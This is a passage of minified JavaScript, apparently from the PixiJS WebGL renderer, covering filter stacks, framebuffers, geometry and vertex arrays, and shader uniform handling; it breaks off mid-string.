m=this.tempRect;m.x=0,m.y=0,m.width=o.sourceFrame.width,m.height=o.sourceFrame.height,o.renderTexture.filterFrame=o.sourceFrame,o.bindingSourceFrame.copyFrom(a.sourceFrame),o.bindingDestinationFrame.copyFrom(a.destinationFrame),o.transform=n.projection.transform,n.projection.transform=null,a.bind(o.renderTexture,o.sourceFrame,m),n.framebuffer.clear(0,0,0,0)},t.prototype.pop=function(){var t=this.defaultFilterStack,e=t.pop(),i=e.filters;this.activeState=e;var r=this.globalUniforms.uniforms;r.outputFrame=e.sourceFrame,r.resolution=e.resolution;var n=r.inputSize,s=r.inputPixel,o=r.inputClamp;if(n[0]=e.destinationFrame.width,n[1]=e.destinationFrame.height,n[2]=1/n[0],n[3]=1/n[1],s[0]=Math.round(n[0]*e.resolution),s[1]=Math.round(n[1]*e.resolution),s[2]=1/s[0],s[3]=1/s[1],o[0]=.5*s[2],o[1]=.5*s[3],o[2]=e.sourceFrame.width*n[2]-.5*s[2],o[3]=e.sourceFrame.height*n[3]-.5*s[3],e.legacy){var a=r.filterArea;a[0]=e.destinationFrame.width,a[1]=e.destinationFrame.height,a[2]=e.sourceFrame.x,a[3]=e.sourceFrame.y,r.filterClamp=r.inputClamp}this.globalUniforms.update();var h=t[t.length-1];if(this.renderer.framebuffer.blit(),1===i.length)i[0].apply(this,e.renderTexture,h.renderTexture,ll.BLEND,e),this.returnFilterTexture(e.renderTexture);else{var u=e.renderTexture,l=this.getOptimalFilterTexture(u.width,u.height,e.resolution);l.filterFrame=u.filterFrame;var c=0;for(c=0;c<i.length-1;++c){1===c&&e.multisample>1&&((l=this.getOptimalFilterTexture(u.width,u.height,e.resolution)).filterFrame=u.filterFrame),i[c].apply(this,u,l,ll.CLEAR,e);var d=u;u=l,l=d}i[c].apply(this,u,h.renderTexture,ll.BLEND,e),c>1&&e.multisample>1&&this.returnFilterTexture(e.renderTexture),this.returnFilterTexture(u),this.returnFilterTexture(l)}e.clear(),this.statePool.push(e)},t.prototype.bindAndClear=function(t,e){void 0===e&&(e=ll.CLEAR);var i=this.renderer,r=i.renderTexture,n=i.state;if(t===this.defaultFilterStack[this.defaultFilterStack.length-1].renderTexture?this.renderer.projection.transform=this.activeState.transform:this.renderer.projection.transform=null,t&&t.filterFrame){var s=this.tempRect;s.x=0,s.y=0,s.width=t.filterFrame.width,s.height=t.filterFrame.height,r.bind(t,t.filterFrame,s)}else t!==this.defaultFilterStack[this.defaultFilterStack.length-1].renderTexture?r.bind(t):this.renderer.renderTexture.bind(t,this.activeState.bindingSourceFrame,this.activeState.bindingDestinationFrame);var o=1&n.stateId||this.forceClear;(e===ll.CLEAR||e===ll.BLIT&&o)&&this.renderer.framebuffer.clear(0,0,0,0)},t.prototype.applyFilter=function(t,e,i,r){var n=this.renderer;n.state.set(t.state),this.bindAndClear(i,r),t.uniforms.uSampler=e,t.uniforms.filterGlobals=this.globalUniforms,n.shader.bind(t),t.legacy=!!t.program.attributeData.aTextureCoord,t.legacy?(this.quadUv.map(e._frame,e.filterFrame),n.geometry.bind(this.quadUv),n.geometry.draw(el.TRIANGLES)):(n.geometry.bind(this.quad),n.geometry.draw(el.TRIANGLE_STRIP))},t.prototype.calculateSpriteMatrix=function(t,e){var i=this.activeState,r=i.sourceFrame,n=i.destinationFrame,s=e._texture.orig,o=t.set(n.width,0,0,n.height,r.x,r.y),a=e.worldTransform.copyTo(Cc.TEMP_MATRIX);return a.invert(),o.prepend(a),o.scale(1/s.width,1/s.height),o.translate(e.anchor.x,e.anchor.y),o},t.prototype.destroy=function(){this.renderer=null,this.texturePool.clear(!1)},t.prototype.getOptimalFilterTexture=function(t,e,i,r){return void 0===i&&(i=1),void 0===r&&(r=gl.NONE),this.texturePool.getOptimalTexture(t,e,i,r)},t.prototype.getFilterTexture=function(t,e,i){if("number"==typeof t){var r=t;t=e,e=r}t=t||this.activeState.renderTexture;var n=this.texturePool.getOptimalTexture(t.width,t.height,e||t.resolution,i||gl.NONE);return n.filterFrame=t.filterFrame,n},t.prototype.returnFilterTexture=function(t){this.texturePool.returnTexture(t)},t.prototype.emptyPool=function(){this.texturePool.clear(!0)},t.prototype.resize=function(){this.texturePool.setScreenSize(this.renderer.view)},t.prototype.transformAABB=function(t,e){var i=wd[0],r=wd[1],n=wd[2],s=wd[3];i.set(e.left,e.top),r.set(e.left,e.bottom),n.set(e.right,e.top),s.set(e.right,e.bottom),t.apply(i,i),t.apply(r,r),t.apply(n,n),t.apply(s,s);var o=Math.min(i.x,r.x,n.x,s.x),a=Math.min(i.y,r.y,n.y,s.y),h=Math.max(i.x,r.x,n.x,s.x),u=Math.max(i.y,r.y,n.y,s.y);e.x=o,e.y=a,e.width=h-o,e.height=u-a},t.prototype.roundFrame=function(t,e,i,r,n){if(!(t.width<=0||t.height<=0||i.width<=0||i.height<=0)){if(n){var s=n.a,o=n.b,a=n.c,h=n.d;if((Math.abs(o)>1e-4||Math.abs(a)>1e-4)&&(Math.abs(s)>1e-4||Math.abs(h)>1e-4))return}(n=n?Sd.copyFrom(n):Sd.identity()).translate(-i.x,-i.y).scale(r.width/i.width,r.height/i.height).translate(r.x,r.y),this.transformAABB(n,t),t.ceil(e),this.transformAABB(n.invert(),t)}},t}(),Cd=function(){function t(t){this.renderer=t}return t.prototype.flush=function(){},t.prototype.destroy=function(){this.renderer=null},t.prototype.start=function(){},t.prototype.stop=function(){this.flush()},t.prototype.render=function(t){},t}(),Id=function(){function t(t){this.renderer=t,this.emptyRenderer=new Cd(t),this.currentRenderer=this.emptyRenderer}return t.prototype.setObjectRenderer=function(t){this.currentRenderer!==t&&(this.currentRenderer.stop(),this.currentRenderer=t,this.currentRenderer.start())},t.prototype.flush=function(){this.setObjectRenderer(this.emptyRenderer)},t.prototype.reset=function(){this.setObjectRenderer(this.emptyRenderer)},t.prototype.copyBoundTextures=function(t,e){for(var i=this.renderer.texture.boundTextures,r=e-1;r>=0;--r)t[r]=i[r]||null,t[r]&&(t[r]._batchLocation=r)},t.prototype.boundArray=function(t,e,i,r){for(var n=t.elements,s=t.ids,o=t.count,a=0,h=0;h<o;h++){var u=n[h],l=u._batchLocation;if(l>=0&&l<r&&e[l]===u)s[h]=l;else for(;a<r;){var c=e[a];if(!c||c._batchEnabled!==i||c._batchLocation!==a){s[h]=a,u._batchLocation=a,e[a]=u;break}a++}}},t.prototype.destroy=function(){this.renderer=null},t}(),Rd=0,Pd=function(){function t(t){this.renderer=t,this.webGLVersion=1,this.extensions={},this.supports={uint32Indices:!1},this.handleContextLost=this.handleContextLost.bind(this),this.handleContextRestored=this.handleContextRestored.bind(this),t.view.addEventListener("webglcontextlost",this.handleContextLost,!1),t.view.addEventListener("webglcontextrestored",this.handleContextRestored,!1)}return Object.defineProperty(t.prototype,"isLost",{get:function(){return!this.gl||this.gl.isContextLost()},enumerable:!1,configurable:!0}),t.prototype.contextChange=function(t){this.gl=t,this.renderer.gl=t,this.renderer.CONTEXT_UID=Rd++,t.isContextLost()&&t.getExtension("WEBGL_lose_context")&&t.getExtension("WEBGL_lose_context").restoreContext()},t.prototype.initFromContext=function(t){this.gl=t,this.validateContext(t),this.renderer.gl=t,this.renderer.CONTEXT_UID=Rd++,this.renderer.runners.contextChange.emit(t)},t.prototype.initFromOptions=function(t){var e=this.createContext(this.renderer.view,t);this.initFromContext(e)},t.prototype.createContext=function(t,e){var i;if(Fl.PREFER_ENV>=Ku.WEBGL2&&(i=t.getContext("webgl2",e)),i)this.webGLVersion=2;else if(this.webGLVersion=1,!(i=t.getContext("webgl",e)||t.getContext("experimental-webgl",e)))throw new Error("This browser does not support WebGL. Try using the canvas renderer");return this.gl=i,this.getExtensions(),this.gl},t.prototype.getExtensions=function(){var t=this.gl,e={anisotropicFiltering:t.getExtension("EXT_texture_filter_anisotropic"),floatTextureLinear:t.getExtension("OES_texture_float_linear"),s3tc:t.getExtension("WEBGL_compressed_texture_s3tc"),s3tc_sRGB:t.getExtension("WEBGL_compressed_texture_s3tc_srgb"),etc:t.getExtension("WEBGL_compressed_texture_etc"),etc1:t.getExtension("WEBGL_compressed_texture_etc1"),pvrtc:t.getExtension("WEBGL_compressed_texture_pvrtc")||t.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc"),atc:t.getExtension("WEBGL_compressed_texture_atc"),astc:t.getExtension("WEBGL_compressed_texture_astc")};1===this.webGLVersion?Object.assign(this.extensions,e,{drawBuffers:t.getExtension("WEBGL_draw_buffers"),depthTexture:t.getExtension("WEBGL_depth_texture"),loseContext:t.getExtension("WEBGL_lose_context"),vertexArrayObject:t.getExtension("OES_vertex_array_object")||t.getExtension("MOZ_OES_vertex_array_object")||t.getExtension("WEBKIT_OES_vertex_array_object"),uint32ElementIndex:t.getExtension("OES_element_index_uint"),floatTexture:t.getExtension("OES_texture_float"),floatTextureLinear:t.getExtension("OES_texture_float_linear"),textureHalfFloat:t.getExtension("OES_texture_half_float"),textureHalfFloatLinear:t.getExtension("OES_texture_half_float_linear")}):2===this.webGLVersion&&Object.assign(this.extensions,e,{colorBufferFloat:t.getExtension("EXT_color_buffer_float")})},t.prototype.handleContextLost=function(t){t.preventDefault()},t.prototype.handleContextRestored=function(){this.renderer.runners.contextChange.emit(this.gl)},t.prototype.destroy=function(){var t=this.renderer.view;this.renderer=null,t.removeEventListener("webglcontextlost",this.handleContextLost),t.removeEventListener("webglcontextrestored",this.handleContextRestored),this.gl.useProgram(null),this.extensions.loseContext&&this.extensions.loseContext.loseContext()},t.prototype.postrender=function(){this.renderer.renderingToScreen&&this.gl.flush()},t.prototype.validateContext=function(t){var e=t.getContextAttributes(),i="WebGL2RenderingContext"in globalThis&&t instanceof globalThis.WebGL2RenderingContext;i&&(this.webGLVersion=2),e&&!e.stencil&&console.warn("Provided WebGL context does not have a stencil buffer, masks may not render correctly");var r=i||!!t.getExtension("OES_element_index_uint");this.supports.uint32Indices=r,r||console.warn("Provided WebGL context does not support 32 index buffer, complex graphics may not render correctly")},t}(),Od=function(t){this.framebuffer=t,this.stencil=null,this.dirtyId=-1,this.dirtyFormat=-1,this.dirtySize=-1,this.multisample=gl.NONE,this.msaaBuffer=null,this.blitFramebuffer=null,this.mipLevel=0},Nd=new bc,Md=function(){function t(t){this.renderer=t,this.managedFramebuffers=[],this.unknownFramebuffer=new nd(10,10),this.msaaSamples=null}return t.prototype.contextChange=function(){var t=this.gl=this.renderer.gl;if(this.CONTEXT_UID=this.renderer.CONTEXT_UID,this.current=this.unknownFramebuffer,this.viewport=new bc,this.hasMRT=!0,this.writeDepthTexture=!0,this.disposeAll(!0),1===this.renderer.context.webGLVersion){var e=this.renderer.context.extensions.drawBuffers,i=this.renderer.context.extensions.depthTexture;Fl.PREFER_ENV===Ku.WEBGL_LEGACY&&(e=null,i=null),e?t.drawBuffers=function(t){return e.drawBuffersWEBGL(t)}:(this.hasMRT=!1,t.drawBuffers=function(){}),i||(this.writeDepthTexture=!1)}else this.msaaSamples=t.getInternalformatParameter(t.RENDERBUFFER,t.RGBA8,t.SAMPLES)},t.prototype.bind=function(t,e,i){void 0===i&&(i=0);var r=this.gl;if(t){var n=t.glFramebuffers[this.CONTEXT_UID]||this.initFramebuffer(t);this.current!==t&&(this.current=t,r.bindFramebuffer(r.FRAMEBUFFER,n.framebuffer)),n.mipLevel!==i&&(t.dirtyId++,t.dirtyFormat++,n.mipLevel=i),n.dirtyId!==t.dirtyId&&(n.dirtyId=t.dirtyId,n.dirtyFormat!==t.dirtyFormat?(n.dirtyFormat=t.dirtyFormat,n.dirtySize=t.dirtySize,this.updateFramebuffer(t,i)):n.dirtySize!==t.dirtySize&&(n.dirtySize=t.dirtySize,this.resizeFramebuffer(t)));for(var s=0;s<t.colorTextures.length;s++){var o=t.colorTextures[s];this.renderer.texture.unbind(o.parentTextureArray||o)}if(t.depthTexture&&this.renderer.texture.unbind(t.depthTexture),e){var a=e.width>>i,h=e.height>>i,u=a/e.width;this.setViewport(e.x*u,e.y*u,a,h)}else a=t.width>>i,h=t.height>>i,this.setViewport(0,0,a,h)}else this.current&&(this.current=null,r.bindFramebuffer(r.FRAMEBUFFER,null)),e?this.setViewport(e.x,e.y,e.width,e.height):this.setViewport(0,0,this.renderer.width,this.renderer.height)},t.prototype.setViewport=function(t,e,i,r){var n=this.viewport;t=Math.round(t),e=Math.round(e),i=Math.round(i),r=Math.round(r),n.width===i&&n.height===r&&n.x===t&&n.y===e||(n.x=t,n.y=e,n.width=i,n.height=r,this.gl.viewport(t,e,i,r))},Object.defineProperty(t.prototype,"size",{get:function(){return this.current?{x:0,y:0,width:this.current.width,height:this.current.height}:{x:0,y:0,width:this.renderer.width,height:this.renderer.height}},enumerable:!1,configurable:!0}),t.prototype.clear=function(t,e,i,r,n){void 0===n&&(n=Ju.COLOR|Ju.DEPTH);var s=this.gl;s.clearColor(t,e,i,r),s.clear(n)},t.prototype.initFramebuffer=function(t){var e=this.gl,i=new Od(e.createFramebuffer());return i.multisample=this.detectSamples(t.multisample),t.glFramebuffers[this.CONTEXT_UID]=i,this.managedFramebuffers.push(t),t.disposeRunner.add(this),i},t.prototype.resizeFramebuffer=function(t){var e=this.gl,i=t.glFramebuffers[this.CONTEXT_UID];i.msaaBuffer&&(e.bindRenderbuffer(e.RENDERBUFFER,i.msaaBuffer),e.renderbufferStorageMultisample(e.RENDERBUFFER,i.multisample,e.RGBA8,t.width,t.height)),i.stencil&&(e.bindRenderbuffer(e.RENDERBUFFER,i.stencil),i.msaaBuffer?e.renderbufferStorageMultisample(e.RENDERBUFFER,i.multisample,e.DEPTH24_STENCIL8,t.width,t.height):e.renderbufferStorage(e.RENDERBUFFER,e.DEPTH_STENCIL,t.width,t.height));var r=t.colorTextures,n=r.length;e.drawBuffers||(n=Math.min(n,1));for(var s=0;s<n;s++){var o=r[s],a=o.parentTextureArray||o;this.renderer.texture.bind(a,0)}t.depthTexture&&this.writeDepthTexture&&this.renderer.texture.bind(t.depthTexture,0)},t.prototype.updateFramebuffer=function(t,e){var i=this.gl,r=t.glFramebuffers[this.CONTEXT_UID],n=t.colorTextures,s=n.length;i.drawBuffers||(s=Math.min(s,1)),r.multisample>1&&this.canMultisampleFramebuffer(t)?(r.msaaBuffer=r.msaaBuffer||i.createRenderbuffer(),i.bindRenderbuffer(i.RENDERBUFFER,r.msaaBuffer),i.renderbufferStorageMultisample(i.RENDERBUFFER,r.multisample,i.RGBA8,t.width,t.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.RENDERBUFFER,r.msaaBuffer)):r.msaaBuffer&&(i.deleteRenderbuffer(r.msaaBuffer),r.msaaBuffer=null,r.blitFramebuffer&&(r.blitFramebuffer.dispose(),r.blitFramebuffer=null));for(var o=[],a=0;a<s;a++){var h=n[a],u=h.parentTextureArray||h;this.renderer.texture.bind(u,0),0===a&&r.msaaBuffer||(i.framebufferTexture2D(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+a,h.target,u._glTextures[this.CONTEXT_UID].texture,e),o.push(i.COLOR_ATTACHMENT0+a))}if(o.length>1&&i.drawBuffers(o),t.depthTexture&&this.writeDepthTexture){var l=t.depthTexture;this.renderer.texture.bind(l,0),i.framebufferTexture2D(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.TEXTURE_2D,l._glTextures[this.CONTEXT_UID].texture,e)}!t.stencil&&!t.depth||t.depthTexture&&this.writeDepthTexture?r.stencil&&(i.deleteRenderbuffer(r.stencil),r.stencil=null):(r.stencil=r.stencil||i.createRenderbuffer(),i.bindRenderbuffer(i.RENDERBUFFER,r.stencil),r.msaaBuffer?i.renderbufferStorageMultisample(i.RENDERBUFFER,r.multisample,i.DEPTH24_STENCIL8,t.width,t.height):i.renderbufferStorage(i.RENDERBUFFER,i.DEPTH_STENCIL,t.width,t.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.RENDERBUFFER,r.stencil))},t.prototype.canMultisampleFramebuffer=function(t){return 1!==this.renderer.context.webGLVersion&&t.colorTextures.length<=1&&!t.depthTexture},t.prototype.detectSamples=function(t){var e=this.msaaSamples,i=gl.NONE;if(t<=1||null===e)return i;for(var r=0;r<e.length;r++)if(e[r]<=t){i=e[r];break}return 1===i&&(i=gl.NONE),i},t.prototype.blit=function(t,e,i){var r=this,n=r.current,s=r.renderer,o=r.gl,a=r.CONTEXT_UID;if(2===s.context.webGLVersion&&n){var h=n.glFramebuffers[a];if(h){if(!t){if(!h.msaaBuffer)return;var u=n.colorTextures[0];if(!u)return;h.blitFramebuffer||(h.blitFramebuffer=new nd(n.width,n.height),h.blitFramebuffer.addColorTexture(0,u)),(t=h.blitFramebuffer).colorTextures[0]!==u&&(t.colorTextures[0]=u,t.dirtyId++,t.dirtyFormat++),t.width===n.width&&t.height===n.height||(t.width=n.width,t.height=n.height,t.dirtyId++,t.dirtySize++)}e||((e=Nd).width=n.width,e.height=n.height),i||(i=e);var l=e.width===i.width&&e.height===i.height;this.bind(t),o.bindFramebuffer(o.READ_FRAMEBUFFER,h.framebuffer),o.blitFramebuffer(e.left,e.top,e.right,e.bottom,i.left,i.top,i.right,i.bottom,o.COLOR_BUFFER_BIT,l?o.NEAREST:o.LINEAR)}}},t.prototype.disposeFramebuffer=function(t,e){var i=t.glFramebuffers[this.CONTEXT_UID],r=this.gl;if(i){delete t.glFramebuffers[this.CONTEXT_UID];var n=this.managedFramebuffers.indexOf(t);n>=0&&this.managedFramebuffers.splice(n,1),t.disposeRunner.remove(this),e||(r.deleteFramebuffer(i.framebuffer),i.msaaBuffer&&r.deleteRenderbuffer(i.msaaBuffer),i.stencil&&r.deleteRenderbuffer(i.stencil)),i.blitFramebuffer&&i.blitFramebuffer.dispose()}},t.prototype.disposeAll=function(t){var e=this.managedFramebuffers;this.managedFramebuffers=[];for(var i=0;i<e.length;i++)this.disposeFramebuffer(e[i],t)},t.prototype.forceStencil=function(){var t=this.current;if(t){var e=t.glFramebuffers[this.CONTEXT_UID];if(e&&!e.stencil){t.stencil=!0;var i=t.width,r=t.height,n=this.gl,s=n.createRenderbuffer();n.bindRenderbuffer(n.RENDERBUFFER,s),e.msaaBuffer?n.renderbufferStorageMultisample(n.RENDERBUFFER,e.multisample,n.DEPTH24_STENCIL8,i,r):n.renderbufferStorage(n.RENDERBUFFER,n.DEPTH_STENCIL,i,r),e.stencil=s,n.framebufferRenderbuffer(n.FRAMEBUFFER,n.DEPTH_STENCIL_ATTACHMENT,n.RENDERBUFFER,s)}}},t.prototype.reset=function(){this.current=this.unknownFramebuffer,this.viewport=new bc},t.prototype.destroy=function(){this.renderer=null},t}(),Fd={5126:4,5123:2,5121:1},Ld=function(){function t(t){this.renderer=t,this._activeGeometry=null,this._activeVao=null,this.hasVao=!0,this.hasInstance=!0,this.canUseUInt32ElementIndex=!1,this.managedGeometries={}}return t.prototype.contextChange=function(){this.disposeAll(!0);var t=this.gl=this.renderer.gl,e=this.renderer.context;if(this.CONTEXT_UID=this.renderer.CONTEXT_UID,2!==e.webGLVersion){var i=this.renderer.context.extensions.vertexArrayObject;Fl.PREFER_ENV===Ku.WEBGL_LEGACY&&(i=null),i?(t.createVertexArray=function(){return i.createVertexArrayOES()},t.bindVertexArray=function(t){return i.bindVertexArrayOES(t)},t.deleteVertexArray=function(t){return i.deleteVertexArrayOES(t)}):(this.hasVao=!1,t.createVertexArray=function(){return null},t.bindVertexArray=function(){return null},t.deleteVertexArray=function(){return null})}if(2!==e.webGLVersion){var r=t.getExtension("ANGLE_instanced_arrays");r?(t.vertexAttribDivisor=function(t,e){return r.vertexAttribDivisorANGLE(t,e)},t.drawElementsInstanced=function(t,e,i,n,s){return r.drawElementsInstancedANGLE(t,e,i,n,s)},t.drawArraysInstanced=function(t,e,i,n){return r.drawArraysInstancedANGLE(t,e,i,n)}):this.hasInstance=!1}this.canUseUInt32ElementIndex=2===e.webGLVersion||!!e.extensions.uint32ElementIndex},t.prototype.bind=function(t,e){e=e||this.renderer.shader.shader;var i=this.gl,r=t.glVertexArrayObjects[this.CONTEXT_UID],n=!1;r||(this.managedGeometries[t.id]=t,t.disposeRunner.add(this),t.glVertexArrayObjects[this.CONTEXT_UID]=r={},n=!0);var s=r[e.program.id]||this.initGeometryVao(t,e,n);this._activeGeometry=t,this._activeVao!==s&&(this._activeVao=s,this.hasVao?i.bindVertexArray(s):this.activateVao(t,e.program)),this.updateBuffers()},t.prototype.reset=function(){this.unbind()},t.prototype.updateBuffers=function(){for(var t=this._activeGeometry,e=this.renderer.buffer,i=0;i<t.buffers.length;i++){var r=t.buffers[i];e.update(r)}},t.prototype.checkCompatibility=function(t,e){var i=t.attributes,r=e.attributeData;for(var n in r)if(!i[n])throw new Error('shader and geometry incompatible, geometry missing the "'+n+'" attribute')},t.prototype.getSignature=function(t,e){var i=t.attributes,r=e.attributeData,n=["g",t.id];for(var s in i)r[s]&&n.push(s,r[s].location);return n.join("-")},t.prototype.initGeometryVao=function(t,e,i){void 0===i&&(i=!0);var r=this.gl,n=this.CONTEXT_UID,s=this.renderer.buffer,o=e.program;o.glPrograms[n]||this.renderer.shader.generateProgram(e),this.checkCompatibility(t,o);var a=this.getSignature(t,o),h=t.glVertexArrayObjects[this.CONTEXT_UID],u=h[a];if(u)return h[o.id]=u,u;var l=t.buffers,c=t.attributes,d={},p={};for(var f in l)d[f]=0,p[f]=0;for(var f in c)!c[f].size&&o.attributeData[f]?c[f].size=o.attributeData[f].size:c[f].size||console.warn("PIXI Geometry attribute '"+f+"' size cannot be determined (likely the bound shader does not have the attribute)"),d[c[f].buffer]+=c[f].size*Fd[c[f].type];for(var f in c){var g=c[f],m=g.size;void 0===g.stride&&(d[g.buffer]===m*Fd[g.type]?g.stride=0:g.stride=d[g.buffer]),void 0===g.start&&(g.start=p[g.buffer],p[g.buffer]+=m*Fd[g.type])}u=r.createVertexArray(),r.bindVertexArray(u);for(var v=0;v<l.length;v++){var _=l[v];s.bind(_),i&&_._glBuffers[n].refCount++}return this.activateVao(t,o),this._activeVao=u,h[o.id]=u,h[a]=u,u},t.prototype.disposeGeometry=function(t,e){var i;if(this.managedGeometries[t.id]){delete this.managedGeometries[t.id];var r=t.glVertexArrayObjects[this.CONTEXT_UID],n=this.gl,s=t.buffers,o=null===(i=this.renderer)||void 0===i?void 0:i.buffer;if(t.disposeRunner.remove(this),r){if(o)for(var a=0;a<s.length;a++){var h=s[a]._glBuffers[this.CONTEXT_UID];h&&(h.refCount--,0!==h.refCount||e||o.dispose(s[a],e))}if(!e)for(var u in r)if("g"===u[0]){var l=r[u];this._activeVao===l&&this.unbind(),n.deleteVertexArray(l)}delete t.glVertexArrayObjects[this.CONTEXT_UID]}}},t.prototype.disposeAll=function(t){for(var e=Object.keys(this.managedGeometries),i=0;i<e.length;i++)this.disposeGeometry(this.managedGeometries[e[i]],t)},t.prototype.activateVao=function(t,e){var i=this.gl,r=this.CONTEXT_UID,n=this.renderer.buffer,s=t.buffers,o=t.attributes;t.indexBuffer&&n.bind(t.indexBuffer);var a=null;for(var h in o){var u=o[h],l=s[u.buffer],c=l._glBuffers[r];if(e.attributeData[h]){a!==c&&(n.bind(l),a=c);var d=e.attributeData[h].location;if(i.enableVertexAttribArray(d),i.vertexAttribPointer(d,u.size,u.type||i.FLOAT,u.normalized,u.stride,u.start),u.instance){if(!this.hasInstance)throw new Error("geometry error, GPU Instancing is not supported on this device");i.vertexAttribDivisor(d,1)}}}},t.prototype.draw=function(t,e,i,r){var n=this.gl,s=this._activeGeometry;if(s.indexBuffer){var o=s.indexBuffer.data.BYTES_PER_ELEMENT,a=2===o?n.UNSIGNED_SHORT:n.UNSIGNED_INT;2===o||4===o&&this.canUseUInt32ElementIndex?s.instanced?n.drawElementsInstanced(t,e||s.indexBuffer.data.length,a,(i||0)*o,r||1):n.drawElements(t,e||s.indexBuffer.data.length,a,(i||0)*o):console.warn("unsupported index buffer type: uint32")}else s.instanced?n.drawArraysInstanced(t,i,e||s.getSize(),r||1):n.drawArrays(t,i,e||s.getSize());return this},t.prototype.unbind=function(){this.gl.bindVertexArray(null),this._activeVao=null,this._activeGeometry=null},t.prototype.destroy=function(){this.renderer=null},t}(),Bd=function(){function t(t){void 0===t&&(t=null),this.type=pl.NONE,this.autoDetect=!0,this.maskObject=t||null,this.pooled=!1,this.isMaskData=!0,this.resolution=null,this.multisample=Fl.FILTER_MULTISAMPLE,this.enabled=!0,this.colorMask=15,this._filters=null,this._stencilCounter=0,this._scissorCounter=0,this._scissorRect=null,this._scissorRectLocal=null,this._colorMask=15,this._target=null}return Object.defineProperty(t.prototype,"filter",{get:function(){return this._filters?this._filters[0]:null},set:function(t){t?this._filters?this._filters[0]=t:this._filters=[t]:this._filters=null},enumerable:!1,configurable:!0}),t.prototype.reset=function(){this.pooled&&(this.maskObject=null,this.type=pl.NONE,this.autoDetect=!0),this._target=null,this._scissorRectLocal=null},t.prototype.copyCountersOrReset=function(t){t?(this._stencilCounter=t._stencilCounter,this._scissorCounter=t._scissorCounter,this._scissorRect=t._scissorRect):(this._stencilCounter=0,this._scissorCounter=0,this._scissorRect=null)},t}();function Ud(t,e,i){var r=t.createShader(e);return t.shaderSource(r,i),t.compileShader(r),r}function kd(t,e){var i=t.getShaderSource(e).split("\n").map((function(t,e){return e+": "+t})),r=t.getShaderInfoLog(e),n=r.split("\n"),s={},o=n.map((function(t){return parseFloat(t.replace(/^ERROR\: 0\:([\d]+)\:.*$/,"$1"))})).filter((function(t){return!(!t||s[t]||(s[t]=!0,0))})),a=[""];o.forEach((function(t){i[t-1]="%c"+i[t-1]+"%c",a.push("background: #FF0000; color:#FFFFFF; font-size: 10px","font-size: 10px")}));var h=i.join("\n");a[0]=h,console.error(r),console.groupCollapsed("click to view full shader code"),console.warn.apply(console,a),console.groupEnd()}function Gd(t){for(var e=new Array(t),i=0;i<e.length;i++)e[i]=!1;return e}function Hd(t,e){switch(t){case"float":case"int":case"uint":case"sampler2D":case"sampler2DArray":return 0;case"vec2":return new Float32Array(2*e);case"vec3":return new Float32Array(3*e);case"vec4":return new Float32Array(4*e);case"ivec2":return new Int32Array(2*e);case"ivec3":return new Int32Array(3*e);case"ivec4":return new Int32Array(4*e);case"uvec2":return new Uint32Array(2*e);case"uvec3":return new Uint32Array(3*e);case"uvec4":return new Uint32Array(4*e);case"bool":return!1;case"bvec2":return Gd(2*e);case"bvec3":return Gd(3*e);case"bvec4":return Gd(4*e);case"mat2":return new Float32Array([1,0,0,1]);case"mat3":return new Float32Array([1,0,0,0,1,0,0,0,1]);case"mat4":return new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1])}return null}var zd,Vd={},Xd=Vd;function jd(t,e,i){if("precision"!==t.substring(0,9)){var r=e;return e===dl.HIGH&&i!==dl.HIGH&&(r=dl.MEDIUM),"precision "+r+" float;\n"+t}return i!==dl.HIGH&&"precision highp"===t.substring(0,15)?t.replace("precision highp","precision mediump"):t}var $d={float:1,vec2:2,vec3:3,vec4:4,int:1,ivec2:2,ivec3:3,ivec4:4,uint:1,uvec2:2,uvec3:3,uvec4:4,bool:1,bvec2:2,bvec3:3,bvec4:4,mat2:4,mat3:9,mat4:16,sampler2D:1};function Wd(t){return $d[t]}var Yd=null,qd={FLOAT:"float",FLOAT_VEC2:"vec2",FLOAT_VEC3:"vec3",FLOAT_VEC4:"vec4",INT:"int",INT_VEC2:"ivec2",INT_VEC3:"ivec3",INT_VEC4:"ivec4",UNSIGNED_INT:"uint",UNSIGNED_INT_VEC2:"uvec2",UNSIGNED_INT_VEC3:"uvec3",UNSIGNED_INT_VEC4:"uvec4",BOOL:"bool",BOOL_VEC2:"bvec2",BOOL_VEC3:"bvec3",BOOL_VEC4:"bvec4",FLOAT_MAT2:"mat2",FLOAT_MAT3:"mat3",FLOAT_MAT4:"mat4",SAMPLER_2D:"sampler2D",INT_SAMPLER_2D:"sampler2D",UNSIGNED_INT_SAMPLER_2D:"sampler2D",SAMPLER_CUBE:"samplerCube",INT_SAMPLER_CUBE:"samplerCube",UNSIGNED_INT_SAMPLER_CUBE:"samplerCube",SAMPLER_2D_ARRAY:"sampler2DArray",INT_SAMPLER_2D_ARRAY:"sampler2DArray",UNSIGNED_INT_SAMPLER_2D_ARRAY:"sampler2DArray"};function Zd(t,e){if(!Yd){var i=Object.keys(qd);Yd={};for(var r=0;r<i.length;++r){var n=i[r];Yd[t[n]]=qd[n]}}return Yd[e]}var Kd,Qd=[{test:function(t){return"float"===t.type&&1===t.size},code:function(t){return'\n            if(uv["'+t+'"] !== ud["'+t+'"].value)\n            {\n                ud["'+t+'"].value = uv["'+t+'"]\n                gl.uniform1f(ud["'+t+'"].location, uv["'+t+'"])\n            }\n            '}},{test:function(t,e){return!("sampler2D"!==t.type&&"samplerCube"!==t.type&&"sampler2DArray"!==t.type||1!==t.size||t.isArray||null!=e&&void 0===e.castToBaseTexture)},code:function(t){return't = syncData.textureCount++;\n\n            renderer.texture.bind(uv["'+t+'"], t);\n\n            if(ud["'+t+'"].value !== t)\n            {\n                ud["'+t+'"].value = t;\n                gl.uniform1i(ud["'+t+'"].location, t);\n; // eslint-disable-line max-len\n            }'}},{test:function(t,e){return"mat3"===t.type&&1===t.size&&void 0!==e.a},code:function(t){return'\n            gl.uniformMatrix3fv(ud["'+t+'"].location, false, uv["'+t+'"].toArray(true));\n            '},codeUbo:function(t){return"\n                var "+t+"_matrix = uv."+t+".toArray(true);\n\n                data[offset] = "+t+"_matrix[0];\n                data[offset+1] = "+t+"_matrix[1];\n                data[offset+2] = "+t+"_matrix[2];\n        \n                data[offset + 4] = "+t+"_matrix[3];\n                data[offset + 5] = "+t+"_matrix[4];\n                data[offset + 6] = "+t+"_matrix[5];\n        \n                data[offset + 